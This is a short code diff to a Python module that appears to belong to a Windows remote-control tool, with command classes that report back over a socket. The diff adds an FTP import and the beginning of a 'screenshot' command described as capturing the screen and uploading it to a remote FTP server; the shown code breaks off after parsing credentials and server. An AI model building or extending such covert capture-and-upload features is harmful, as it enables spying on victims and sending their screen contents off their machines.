@@ -1,4 +1,4 @@
-import subprocess,win32api,ctypes,getpass,sock
+import subprocess,win32api,ctypes,getpass,sock,ftplib
 class cmd:
     def __init__(self):
         self.command = 'cmd'
@@ -32,3 +32,13 @@ class messagebox:
         sock.sock.s.send("Box was opened\n")
         Box(None,args,"Message", 0)
         return "Message box was closed\n"
+class screenshot:
+    def __init__(self):
+        self.command = 'screenshot'
+        self.description = 'taking screenshot and uploading to ftp server with: screenshot <pass> <user> <server>'
+        self.args = True
+    def main(self,args):
+        args = args.split(" ")
+        password = args[0]
+        user = args[1]
+        server = args[2]
